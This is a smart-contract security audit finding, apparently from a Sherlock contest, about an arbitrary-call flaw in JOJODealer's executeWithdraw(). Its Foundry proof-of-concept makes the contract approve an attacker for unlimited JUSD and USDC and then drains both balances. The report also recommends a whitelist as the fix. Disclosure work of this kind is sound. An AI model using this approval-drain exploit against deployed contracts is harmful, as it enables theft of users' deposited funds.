# An attacker can steal all USDC and JUSD from JOJODealer contract

## Summary
The JOJODealer contract inherits from JOJOExternal, JOJOOperation, and JOJOView, thereby gaining access to all functions defined in these contracts. Our focus is specifically on the JOJOExternal contract, which exposes the Funding library and allows users to interact with functions such as deposit(), requestWithdraw(), and executeWithdraw(). In these primary functions, we simply invoke the corresponding functions from the Funding library without introducing any modifications.

The issue arises in the executeWithdraw() function, where we trust user-supplied parameters. This trust will enable a malicious actor to steal all funds within the JOJODealer contract.

## Vulnerability Detail

As JOJODealer serves as a hub for various traders executing diverse actions, the contract accumulates substantial balances in both USDC and JUSD. The critical concern lies in the executeWithdraw() function, which calls Funding.executeWithdraw(). In both functions, there is a lack of validation for various inputs. This deficiency creates an opportunity for a malicious actor to craft a transaction with malicious parameters, draining the contract, and the contract will accept it without proper verification.

Here is a POC example below to illustrate this issue and demonstrate how it can manifest:

Add this test in DealerFundTest.sol and run it with 
```shell
forge test --match-test testExecuteWithdrawCraftedToStealTokens -vvvvv
```
```solidity
    function testExecuteWithdrawCraftedToStealTokens() public {
            
            vm.startPrank(traders[0]);
            jojoDealer.deposit(1_000_000e6, 1_000_000e6, traders[0]); // Normal trader[0] making a deposit withou any issue

            vm.stopPrank();

            vm.startPrank(traders[1]);
            jojoDealer.deposit(100_000e6, 100_000e6, traders[1]); // Normal trader[1] making a deposit withou any issue
            jojoDealer.deposit(100_000e6, 100_000e6, traders[1]); // Normal trader[1] making a deposit withou any issue
            jojoDealer.deposit(100_000e6, 100_000e6, traders[1]); // Normal trader[1] making a deposit withou any issue
            vm.stopPrank();

            vm.startPrank(traders[2]);
            jojoDealer.deposit(100_000e6, 100_000e6, traders[2]); // Normal trader[2] making a deposit withou any issue
            jojoDealer.deposit(100_000e6, 100_000e6, traders[2]); // Normal trader[2] making a deposit withou any issue
            vm.stopPrank();

            vm.startPrank(traders[0]);
            jojoDealer.requestWithdraw(traders[0], 500_000e6, 200_000e6); // Normal trder[0] requesting withdraw till now all the system is working fine
            vm.stopPrank();

            address hacker = vm.addr(10000000000000000);
        
            vm.startPrank(hacker);   
        

            jojoDealer.executeWithdraw(hacker, address(jusd), false, 
                abi.encodeWithSignature("approve(address,uint256)", address(hacker), type(uint256).max)
            ); //  we can call this function even though we didnt deposit with any address and param the contract doesnt check

            jojoDealer.executeWithdraw(hacker, address(usdc), false, 
                abi.encodeWithSignature("approve(address,uint256)", address(hacker), type(uint256).max)
            ); //  we can call this function even though we didnt deposit with any address and param the contract doesnt check


            jusd.transferFrom(address(jojoDealer), hacker, jusd.balanceOf(address(jojoDealer))); //after approval we can withdraw all jusd balance of jojoDealer
            usdc.transferFrom(address(jojoDealer), hacker, usdc.balanceOf(address(jojoDealer))); //after approval we can withdraw all usdc balance of jojoDealer


            jusd.balanceOf(address(jojoDealer)); //This will be 0 since the hacker holds now all the tokens 
            usdc.balanceOf(address(jojoDealer)); //This will be 0 since the hacker holds now all the tokens 
            
        } 
```

To elaborate on the provided POC, in the first part, we simulate a real environment by connecting with various traders' accounts for some deposits. However, upon connecting as a hacker account, it becomes apparent that the supplied parameters are not accurate. The executeWithdraw() function invoked by the hacker ultimately translates to (bool success,) = to.call(param) check this [lines](https://github.com/sherlock-audit/2023-12-jojo-exchange-update/blob/main/smart-contract-EVM/src/libraries/Funding.sol#L173-L175) in Funding.sol, both to and param are specified by the user.

The malicious executeWithdraw() proceeds to call the approve() function in both JUSD and USDC with maxUint256, designating the hacker as the spender and the owner will be jojoDealer contract . Subsequently, the attacker can exploit this approval to transfer all tokens to their own address.

## Impact
All users fund that were originally deposited will be drained. The exact same issue happened to a project called SocketDotTech see this [link](https://twitter.com/CharlesWangP/status/1747656219047723243).

Manual Review

## Recommendation

I strongly recommend adopting the same design approach as the FlashLoanLiquidate contract. Specifically, ensure that only contracts whitelisted in whiteListContract can be deemed trustworthy, and do not extend trust to any arbitrary address.
